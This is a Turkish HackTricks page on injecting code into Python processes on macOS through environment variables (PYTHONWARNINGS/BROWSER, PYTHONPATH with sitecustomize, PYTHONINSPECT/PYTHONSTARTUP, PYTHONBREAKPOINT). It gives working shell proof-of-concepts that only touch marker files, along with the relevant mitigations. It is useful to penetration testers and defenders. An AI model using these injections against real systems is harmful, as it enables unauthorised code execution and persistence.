# macOS Python Uygulamalarına Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` ve `BROWSER` ortam değişkenleri aracılığıyla

Bir saldırgan Python sürecinin ortamını kontrol edebiliyorsa, `PYTHONWARNINGS` ve `BROWSER` değişkenlerinin birlikte kullanılması, Python hazırlanmış bir uyarı seçeneğini işlerken `antigravity` modülünü içe aktardığında komut çalıştırılmasını sağlayabilir. Bu teknik, `antigravity` modülünün Python'ın `webbrowser` modülüyle bir URL açmasına dayanır; bu modül `BROWSER` ortam değişkenini dikkate alır.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## `PYTHONPATH` ve `sitecustomize.py` aracılığıyla

Python normal başlangıç sırasında `site` modülü site'a özgü yolları ekler ve ardından `sitecustomize` adlı bir modülü içe aktarmayı dener. Saldırganın okuyabildiği bir dizini `PYTHONPATH` içinde ilk sıraya koyarak, süreç ortamını kontrol eden bir saldırgan Python'a hedef betikten önce bir payload içe aktarabilir. `-S` flag'i otomatik `site` başlatmasını devre dışı bırakırken, yalıtılmış mod (`-I`) `PYTHONPATH`'i yok sayar ve `-s` ile `-E` flag'lerini de etkinleştirir.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Yazılabilir bir kullanıcı site dizini üzerinden kalıcılık sağlamak için, devralınan `PYTHONPATH` yerine [Python `.pth`, `.start` ve `usercustomize` başlangıç dosyalarına](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize) bakın.

## Bir betik sonrasında `PYTHONINSPECT` ve `PYTHONSTARTUP` aracılığıyla

CPython 3.13+ sürümünde, `PYTHONINSPECT=1` ile başlatılan bir betik tamamlandığında etkileşimli oturuma girer. Standart girdi bir terminalse ve PyREPL kullanılabiliyorsa bu oturum, hedef betikten **sonra** ve istemden önce `PYTHONSTARTUP` tarafından belirtilen dosyayı çalıştırır. Bu nedenle, devralınan her iki değişkeni ve okunabilir bir başlangıç dosyasını kontrol eden bir saldırgan, betiğini değiştirmeden hedef süreçte kod çalıştırabilir. Bu, normal bir başlangıç kancası değil, betik sonrası bir tetikleyicidir.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Zincir, eski CPython sürümlerinde, standart girdi terminal olmadığında veya `PYTHONBREAKPOINT` temel REPL'i zorladığında başlangıç dosyasını çalıştırmaz. `-E` ve `-I`, `PYTHON*` değişkenlerini yok sayar. Bu yönteme güvenmeden önce kullanılan yorumlayıcıyı ve terminal bağlamını kontrol edin.<sup>[[3]](#references)[[5]](#references)</sup>

## `PYTHONBREAKPOINT` Üzerinden

Python 3.7'den itibaren (PEP 553), yerleşik `breakpoint()` işlevi `sys.breakpointhook`'un gösterdiği şeyi içe aktarır ve çağırır; bu hedef **`PYTHONBREAKPOINT`** ortam değişkeninden alınır (`package.module.callable`). Adı belirtilen modülün içe aktarılması ve callable'ın çağrılması, hata ayıklayıcı normalde açılmadan önce gerçekleşir. Bu nedenle, `breakpoint()` noktasına ulaşan bir sürecin ortamını kontrol eden saldırgan (bakım/hata ayıklama betiklerinde yaygındır ve bazen üretim yollarında da unutulur) kod yürütme elde eder.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Unlike `PYTHONWARNINGS`/`PYTHONPATH`, bunun için hedefin gerçekten bir `breakpoint()` çağrısına ulaşması gerekir; ancak bu yöntem yalnızca adı belirtilen modülün **import yan etkileri** üzerinden de çalışır (import edilebilir herhangi bir modülü hedef gösterin — örneğin `PYTHONPATH` üzerinde ilk sıraya yerleştirilmiş ve en üst düzeyinde kod çalıştıran bir modülü). `PYTHONBREAKPOINT=0` hook'u tamamen devre dışı bırakır.



## References

- [1] [Ortam Değişkenleriyle Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Siteye Özgü Yapılandırma Hook'u](https://docs.python.org/3/library/site.html)
- [3] [Python komut satırı ve ortam](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Yerleşik breakpoint() ve PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython yorumlayıcısı REPL yönlendirmesi (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL başlangıç dosyasının yürütülmesi (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
